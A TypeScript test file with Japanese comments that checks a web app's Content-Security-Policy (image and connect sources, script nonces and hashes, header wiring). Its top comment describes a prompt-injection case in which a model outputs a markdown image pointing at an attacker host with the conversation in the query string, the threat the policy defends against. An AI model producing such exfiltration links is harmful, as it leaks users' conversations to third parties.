import { readFileSync } from "node:fs";

import { describe, expect, it } from "vitest";

import {
  contentSecurityPolicy,
  makeNonce,
  sha256Base64,
} from "../app/lib/csp";
import { APPEARANCE_INIT_SCRIPT } from "../app/lib/appearance-init";

/**
 * CSP の主眼は「開いただけで会話が外へ出る」経路を塞ぐこと（E-3）。
 *
 * インジェクションを受けたモデルが `![](https://攻撃者/?q=会話)` を出すと、
 * 画像を取りに行った時点で本文が相手に渡る。記法としては正しい画像なので
 * 本文の消毒では止まらず、ブラウザ側で読ませないほかない。
 */

const parse = (policy: string) =>
  new Map(
    policy.split("; ").map((part) => {
      const [name, ...values] = part.split(" ");
      return [name, values] as const;
    }),
  );

const prod = () =>
  parse(contentSecurityPolicy({ nonce: "N0NCE", scriptHash: "HASH" }));

describe("Content-Security-Policy", () => {
  it("外部の画像を読ませない", () => {
    const img = prod().get("img-src")!;
    expect(img).toEqual(["'self'", "data:", "blob:"]);
    // ここが緩むと流出経路が開く。ワイルドカードや https: が
    // 紛れ込んでいないことまで見る
    expect(img).not.toContain("*");
    expect(img).not.toContain("https:");
  });

  it("外部への通信も遮る", () => {
    expect(prod().get("connect-src")).toEqual(["'self'"]);
  });

  it("埋め込みと差し込みの口を閉じる", () => {
    const p = prod();
    expect(p.get("frame-ancestors")).toEqual(["'none'"]);
    expect(p.get("object-src")).toEqual(["'none'"]);
    expect(p.get("base-uri")).toEqual(["'self'"]);
    expect(p.get("form-action")).toEqual(["'self'"]);
    expect(p.get("default-src")).toEqual(["'self'"]);
  });

  it("本番では nonce とハッシュでスクリプトを絞る", () => {
    const script = prod().get("script-src")!;
    expect(script).toContain("'nonce-N0NCE'");
    expect(script).toContain("'sha256-HASH'");
    // nonce があると 'unsafe-inline' は無視される。並べても効かないうえ、
    // 「緩めてある」と誤読させるので入れない
    expect(script).not.toContain("'unsafe-inline'");
    expect(script).not.toContain("'unsafe-eval'");
  });

  it("開発では nonce を出さない（出すと 'unsafe-inline' が無視される）", () => {
    const p = parse(
      contentSecurityPolicy({ nonce: "N0NCE", scriptHash: "HASH", dev: true }),
    );
    const script = p.get("script-src")!;
    expect(script).toContain("'unsafe-inline'");
    // ここに nonce が混じると Vite のプリアンブルが弾かれ、
    // 開発サーバーが真っ白になる
    expect(script.some((v) => v.startsWith("'nonce-"))).toBe(false);
    expect(script.some((v) => v.startsWith("'sha256-"))).toBe(false);
    expect(p.get("connect-src")).toContain("ws:");
  });

  it("開発でも画像は絞ったまま（違反に開発中に気づけるように）", () => {
    const p = parse(
      contentSecurityPolicy({ nonce: "N0NCE", scriptHash: "HASH", dev: true }),
    );
    expect(p.get("img-src")).toEqual(["'self'", "data:", "blob:"]);
  });

  it("nonce は要求ごとに変わる", () => {
    expect(makeNonce()).not.toBe(makeNonce());
    expect(makeNonce()).toMatch(/^[A-Za-z0-9+/]+=*$/);
  });
});

describe("インラインスクリプトのハッシュ", () => {
  it("既知の値と一致する（base64 の作りを取り違えていない）", async () => {
    // echo -n "abc" | openssl dgst -sha256 -binary | base64
    expect(await sha256Base64("abc")).toBe(
      "ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0=",
    );
  });

  it("初期化スクリプトが変われば値も変わる", async () => {
    const a = await sha256Base64(APPEARANCE_INIT_SCRIPT);
    const b = await sha256Base64(APPEARANCE_INIT_SCRIPT + " ");
    expect(a).not.toBe(b);
    expect(a).toMatch(/^[A-Za-z0-9+/]+=*$/);
  });
});

/**
 * 配線のガード。
 *
 * ハッシュ方式の弱点は、**ずれても静かに壊れる**こと。root.tsx が定数を
 * 使わずに自前で連結すると、片方を変えた瞬間にハッシュが合わなくなり、
 * スクリプトが実行されなくなる（＝毎回テーマがちらつく）。画面には
 * エラーが出ないので気づけない。ここで結び付きだけ見張る。
 */
describe("CSP の配線", () => {
  // vitest はリポジトリの root から走るので、そのまま相対で読める
  const read = (file: string) => readFileSync(file, "utf8");

  it("root.tsx は共有の定数をそのまま埋める", () => {
    const src = read("app/root.tsx");
    expect(src).toContain("APPEARANCE_INIT_SCRIPT");
    // 自前で連結し直すとハッシュが合わなくなる
    expect(src).not.toMatch(/THEME_INIT_SCRIPT\s*\+/);
    expect(src).not.toMatch(/ACCENT_INIT_SCRIPT\s*\+/);
  });

  it("entry.server は nonce を ServerRouter へ渡し、ヘッダを付ける", () => {
    const src = read("app/entry.server.tsx");
    expect(src).toMatch(/<ServerRouter[^>]*nonce=\{nonce\}/s);
    expect(src).toContain('"Content-Security-Policy"');
    // ハッシュは埋め込む本体と同じ定数から取る
    expect(src).toContain("APPEARANCE_INIT_SCRIPT");
  });
});
